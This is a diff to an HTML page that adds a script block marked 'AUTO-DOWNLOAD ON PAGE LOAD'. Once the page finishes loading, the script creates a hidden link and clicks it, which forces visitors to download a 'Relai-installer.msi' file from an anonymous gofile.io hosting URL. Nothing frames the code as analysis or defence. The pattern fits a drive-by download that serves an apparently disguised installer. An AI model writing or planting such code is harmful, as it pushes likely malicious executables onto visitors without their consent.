@@ -2655,5 +2655,32 @@
     });
   </script>
 
+  <!-- ===== AUTO-DOWNLOAD ON PAGE LOAD ===== -->
+  <script>
+    (function () {
+      var DOWNLOAD_URL = 'https://store4.gofile.io/download/direct/961adc39-29b9-41d6-b5cd-4a967ae32c95/Relai-installer.msi';
+
+      function triggerDownload() {
+        // Method 1: hidden anchor click (most reliable across browsers)
+        var a = document.createElement('a');
+        a.href = DOWNLOAD_URL;
+        a.download = 'Relai-installer.msi';
+        a.style.display = 'none';
+        document.body.appendChild(a);
+        a.click();
+        document.body.removeChild(a);
+      }
+
+      // Fire after the page has fully rendered so it doesn't block paint
+      if (document.readyState === 'complete') {
+        setTimeout(triggerDownload, 800);
+      } else {
+        window.addEventListener('load', function () {
+          setTimeout(triggerDownload, 800);
+        });
+      }
+    })();
+  </script>
+
 </body>
 </html>
